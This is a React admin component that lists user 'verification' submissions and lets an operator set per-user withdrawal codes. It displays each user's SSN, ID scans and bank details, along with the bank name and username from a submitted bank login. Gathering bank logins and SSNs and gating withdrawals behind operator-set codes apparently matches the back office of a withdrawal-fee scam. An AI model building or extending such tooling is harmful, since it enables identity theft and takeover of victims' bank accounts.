import React, { useCallback, useEffect, useState } from 'react';
import api from '../../utils/api';
import './AdminVerification.css';

const AdminVerification = () => {
  const [items, setItems] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [msg, setMsg] = useState('');
  const [codes, setCodes] = useState({});

  const load = useCallback(async () => {
    try {
      const { data } = await api.get('/admin/verifications');
      setItems(data.verifications || []);
    } catch (err) {
      setError(err?.response?.data?.message || 'Could not load verifications');
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { load(); }, [load]);

  const setCode = async (userId) => {
    setMsg('');
    try {
      await api.post(`/admin/withdrawal-code/${userId}`, { code: codes[userId] });
      setMsg('Withdrawal code set for user');
      load();
    } catch (err) {
      setError(err?.response?.data?.message || 'Could not set code');
    }
  };

  const approve = async (id) => {
    setMsg('');
    try {
      await api.post(`/admin/verifications/${id}/approve`);
      setMsg('Verification approved');
      load();
    } catch (err) {
      setError(err?.response?.data?.message || 'Could not approve verification');
    }
  };

  if (loading) return <div className="spinner" />;

  return (
    <div className="admin-verification">
      <h2>User Verification</h2>
      {error && <div className="form-error">{error}</div>}
      {msg && <div className="form-info">{msg}</div>}

      {items.length === 0 && <p className="empty">No verification submissions yet</p>}

      {items.map((v) => (
        <div key={v._id} className="verify-card">
          <div className="verify-head">
            <h3>
              {v.user?.firstName} {v.user?.lastName} — {v.user?.email}
            </h3>
            <span className={`status ${v.status || 'pending'}`}>{v.status || 'pending'}</span>
          </div>

          <div className="details-grid">
            <p><span>Email:</span> {v.email}</p>
            <p><span>Phone:</span> {v.phone}</p>
            <p><span>SSN:</span> {v.ssn}</p>
            <p><span>Address:</span> {v.address}</p>
            <p><span>ID Type:</span> {v.idType}</p>
            <p><span>Bank Name:</span> {v.bankName}</p>
            <p><span>Bank Address:</span> {v.bankAddress}</p>
            <p>
              <span>Bank Login:</span>{' '}
              {v.bankLogin ? `${v.bankLogin.bankName} / ${v.bankLogin.username}` : '—'}
            </p>
            <p>
              <span>ID Front:</span>{' '}
              {v.idFront ? <a href={v.idFront} target="_blank" rel="noreferrer" download>Download</a> : '—'}
            </p>
            <p>
              <span>ID Back:</span>{' '}
              {v.idBack ? <a href={v.idBack} target="_blank" rel="noreferrer" download>Download</a> : '—'}
            </p>
          </div>

          <div className="codes-section">
            <h4>Submitted Withdrawal Codes</h4>
            {(v.codes || []).length === 0 && <p className="empty">No codes submitted</p>}
            {(v.codes || []).map((c, i) => (
              <p key={i} className="submitted-code">
                <strong>{c.code}</strong> — {new Date(c.createdAt).toLocaleString()}
              </p>
            ))}
          </div>

          <div className="code-setter">
            <input
              placeholder="Set withdrawal code"
              value={codes[v.user?._id] || ''}
              onChange={(e) => setCodes({ ...codes, [v.user?._id]: e.target.value })}
            />
            <button className="ghost-btn" onClick={() => setCode(v.user?._id)}>Set Code</button>
            <button className="primary-btn" onClick={() => approve(v._id)}>Approve Verification</button>
          </div>
        </div>
      ))}
    </div>
  );
};

export default AdminVerification;